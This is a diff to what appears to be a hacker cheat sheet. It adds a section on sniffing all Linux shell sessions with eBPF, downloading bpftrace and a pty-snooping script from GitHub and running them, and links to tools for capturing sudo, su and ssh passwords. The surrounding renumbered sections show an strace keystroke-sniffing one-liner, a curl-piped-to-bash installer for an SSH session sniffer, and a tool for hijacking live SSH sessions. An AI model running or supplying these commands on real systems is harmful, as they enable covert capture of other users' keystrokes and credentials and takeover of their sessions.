@@ -87,6 +87,7 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
 1. [SSH session sniffing and hijacking](#ssh-sniffing)
    1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
+   2. [Sniff all SHELL sessions with eBPF](#bpf)
    1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
    1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
    1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
@@ -1716,8 +1717,21 @@ Start a dtrace and log to /tmp/.log:
 (dtrace -sd >/tmp/.log &)
 ```
 
+<a id="bpf"></a>
+**9.iii Sniff all SHELL sessions with eBPF**
+
+eBPF allows us to *safely* hook over 120,000 functions in the kernel. It's like a better "dtrace" but for Linux.  
+
+```sh
+curl -o bpftrace -fsSL https://github.com/iovisor/bpftrace/releases/latest/download/bpftrace
+chmod 755 bpftrace
+curl -o ptysnoop.bt -fsSL https://github.com/hackerschoice/bpfhacks/raw/main/ptysnoop.bt
+./bpftrace -Bnone ptysnoop.bt
+```
+Check out our very own [eBPF tools to sniff sudo/su/ssh passwords](https://github.com/hackerschoice/bpfhacks).
+
 <a id="ssh-sniffing-strace"></a>
-**9.iii Sniff a user's outgoing SSH session with strace**
+**9.iv Sniff a user's outgoing SSH session with strace**
 ```sh
 strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
 ```
@@ -1725,7 +1739,7 @@ Dirty way to monitor a user who is using *ssh* to connect to another host from a
 
 
 <a id="ssh-sniffing-wrapper"></a>
-**9.iv. Sniff a user's outgoing SSH session with a wrapper script**
+**9.v. Sniff a user's outgoing SSH session with a wrapper script**
 
 Even dirtier method in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH sessions)
 
@@ -1771,7 +1785,7 @@ To uninstall cut & paste this\033[0m:\033[1;36m
 The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.
 
 <a id="ssh-sniffing-sshit"></a>
-**9.v Sniff a user's outgoing SSH session using SSH-IT**
+**9.vi Sniff a user's outgoing SSH session using SSH-IT**
 
 The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-it/).
 
@@ -1780,7 +1794,7 @@ bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
 <a id="hijack"></a>
-**9.vi Hijack / Take-over a running SSH session**  
+**9.vii Hijack / Take-over a running SSH session**  
 
 Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
 ```sh
